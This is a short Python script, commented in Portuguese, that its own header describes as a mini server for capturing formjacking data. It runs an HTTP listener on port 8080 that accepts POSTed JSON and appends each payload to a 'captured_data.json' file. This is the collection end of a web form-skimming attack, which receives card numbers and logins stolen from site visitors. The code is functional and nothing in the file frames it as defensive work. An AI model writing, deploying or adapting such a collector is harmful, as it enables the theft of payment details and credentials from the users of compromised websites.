# data_logger.py — Mini servidor para capturar dados do Formjacking

from http.server import BaseHTTPRequestHandler, HTTPServer
import json
import os
from pathlib import Path

OUTPUT_DIR = Path(__file__).parent / "output"
OUTPUT_DIR.mkdir(exist_ok=True)

class LoggerHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        post_body = self.rfile.read(content_length)
        
        try:
            data = json.loads(post_body)
            filename = OUTPUT_DIR / "captured_data.json"
            
            with open(filename, "a", encoding="utf-8") as f:
                json.dump(data, f, indent=2)
                f.write(",\n")
            
            print(f"[✔] Dados capturados: {data}")

        except Exception as e:
            print(f"[ERRO] Falha ao processar payload: {e}")

        self.send_response(200)
        self.end_headers()

def run_server(port=8080):
    server_address = ('', port)
    httpd = HTTPServer(server_address, LoggerHandler)
    print(f"[+] Servidor escutando na porta {port}...")
    httpd.serve_forever()

if __name__ == "__main__":
    run_server()
